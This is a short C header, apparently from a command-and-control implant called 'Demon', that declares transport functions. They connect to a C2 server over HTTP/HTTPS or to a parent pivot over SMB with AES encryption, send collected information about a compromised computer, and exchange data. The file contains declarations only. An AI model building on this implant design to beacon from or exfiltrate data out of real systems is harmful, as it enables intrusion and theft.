#ifndef ICECUBE_INTERNET_H
#define ICECUBE_INTERNET_H

#include <Demon.h>

#include <Core/Package.h>
#include <winhttp.h>

#define TRANSPORT_HTTP_ROTATION_ROUND_ROBIN  0
#define TRANSPORT_HTTP_ROTATION_RANDOM       1

/*!
 * Initialize HTTP/HTTPS Connection to C2 Server + using AES encryption or
 * Initializes a connection to the parent pivot over SMB + using AES encryption
 * and send the collected user/computer info about the compromised Computer
 * @return Return if functions ran successful
 */
BOOL TransportInit();

/*!
 * Send our specified data + encrypt it with random key
 * @param Data Data we want to send
 * @param Size Size of Data we want to send
 * @return Return if functions ran successful
 */
BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize );

#ifdef TRANSPORT_SMB
/*!
 * Receive data from our connected parent agent.
 * @param Data Data buffer to save our data received from the server
 * @param Size Size of received data
 * @return Return if functions ran successful
 */
PVOID TransportRecv( PSIZE_T Size );
#endif

#endif
